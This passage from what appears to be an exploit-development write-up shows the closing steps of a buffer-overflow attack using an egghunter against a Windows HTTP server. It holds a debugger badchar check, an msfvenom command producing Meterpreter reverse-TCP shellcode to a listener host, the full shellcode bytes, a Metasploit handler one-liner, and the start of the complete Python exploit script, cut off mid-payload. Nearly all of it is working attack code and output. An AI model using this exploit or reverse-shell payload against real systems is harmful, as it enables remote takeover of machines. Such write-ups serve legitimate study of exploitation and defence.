</span></span></code></pre></div><p>Lastly, we have checked if badchars are present in all of the code we have inserted but not on the payload that is going to execute. Let&rsquo;s insert a badchar array and check if any of the badchars is present:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span>  w00tw00t........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">04</span>c38186  L110
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span>  w00tw00t........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38196  <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">0</span>b <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">0f</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">13</span> <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">1</span>a  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381a6  <span style="color:#ae81ff">1</span>b <span style="color:#ae81ff">1</span>c <span style="color:#ae81ff">1</span>d <span style="color:#ae81ff">1</span>e <span style="color:#ae81ff">1f</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span><span style="color:#f92672">-</span><span style="color:#ae81ff">23</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">26</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">2</span>a <span style="color:#ae81ff">2</span>b  ..... <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;#$&amp;&#39;()*+</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381b6  <span style="color:#ae81ff">2</span>c <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">2</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">33</span><span style="color:#f92672">-</span><span style="color:#ae81ff">34</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">3</span>a <span style="color:#ae81ff">3</span>b  ,<span style="color:#f92672">-</span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">01234567</span><span style="color:#ae81ff">89</span><span style="color:#f92672">:</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381c6  <span style="color:#ae81ff">3</span>c <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">3f</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">4</span>a <span style="color:#ae81ff">4</span>b  <span style="color:#f92672">&lt;=&gt;?</span><span style="color:#960050;background-color:#1e0010">@</span>ABCDEFGHIJK
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381d6  <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">4f</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">53</span><span style="color:#f92672">-</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">5</span>b  LMNOPQRSTUVWXYZ[
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381e6  <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">5f</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">63</span><span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">6</span>b  <span style="color:#960050;background-color:#1e0010">\</span>]<span style="color:#f92672">^</span>_<span style="color:#960050;background-color:#1e0010">`</span>abcdefghijk
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381f6  <span style="color:#ae81ff">6</span>c <span style="color:#ae81ff">6</span>d <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">73</span><span style="color:#f92672">-</span><span style="color:#ae81ff">74</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">7</span>a <span style="color:#ae81ff">7</span>b  lmnopqrstuvwxyz{
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38206  <span style="color:#ae81ff">7</span>c <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">7</span>e <span style="color:#ae81ff">7f</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">82</span> <span style="color:#ae81ff">83</span><span style="color:#f92672">-</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">86</span> <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">8</span>b  <span style="color:#f92672">|</span>}<span style="color:#f92672">~</span>.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38216  <span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">8f</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">93</span><span style="color:#f92672">-</span><span style="color:#ae81ff">94</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">97</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">9</span>a <span style="color:#ae81ff">9</span>b  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38226  <span style="color:#ae81ff">9</span>c <span style="color:#ae81ff">9</span>d <span style="color:#ae81ff">9</span>e <span style="color:#ae81ff">9f</span> a0 a1 a2 a3<span style="color:#f92672">-</span>a4 a5 a6 a7 a8 a9 aa ab  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38236  ac ad ae af b0 b1 b2 b3<span style="color:#f92672">-</span>b4 b5 b6 b7 b8 b9 ba bb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38246  bc bd be bf c0 c1 c2 c3<span style="color:#f92672">-</span>c4 c5 c6 c7 c8 c9 ca cb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38256  cc cd ce cf d0 d1 d2 d3<span style="color:#f92672">-</span>d4 d5 d6 d7 d8 d9 da db  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38266  dc dd de df e0 e1 e2 e3<span style="color:#f92672">-</span>e4 e5 e6 e7 e8 e9 ea eb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38276  ec ed ee ef f0 f1 f2 f3<span style="color:#f92672">-</span>f4 f5 f6 f7 f8 f9 fa fb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38286  fc fd fe ff 
</span></span></code></pre></div><p>0a does not appear so we will count it as a badchar.
Let&rsquo;s generate the payload and start listening once we send the full payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">192.168.122.211</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> <span style="color:#f92672">-</span>f python <span style="color:#f92672">-</span>v payload <span style="color:#f92672">-</span>b <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] No platform was selected, choosing Msf<span style="color:#f92672">::</span>Module<span style="color:#f92672">::</span>Platform<span style="color:#f92672">::</span>Windows from the payload
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">11</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86<span style="color:#f92672">/</span>shikata_ga_nai
</span></span><span style="display:flex;"><span>x86<span style="color:#f92672">/</span>shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> (iteration<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>x86<span style="color:#f92672">/</span>shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
</span></span><span style="display:flex;"><span>Final size of python file: <span style="color:#ae81ff">2064</span> bytes
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x26\xdd\x4c\x51\x38\xf4</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo msfconsole <span style="color:#f92672">-</span>q <span style="color:#f92672">-</span>x <span style="color:#e6db74">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.122.211; set LPORT 443; exploit&#34;</span>
</span></span></code></pre></div><p>And a shell was gotten.
The complete payload that implements our egghunter is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:  
</span></span><span style="display:flex;"><span> server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.122.113&#34;</span>  
</span></span><span style="display:flex;"><span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>  
</span></span><span style="display:flex;"><span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">253</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># bp 0x418674  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 00 0a 0d 25 -&gt; badchars  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xC9\x85\xC9\x0F\x84\x11</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; /&#34;</span>  <span style="color:#75715e"># xor ecx, ecx; test ecx, ecx; je 0x17  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d</span><span style="color:#e6db74">&#34;</span>  
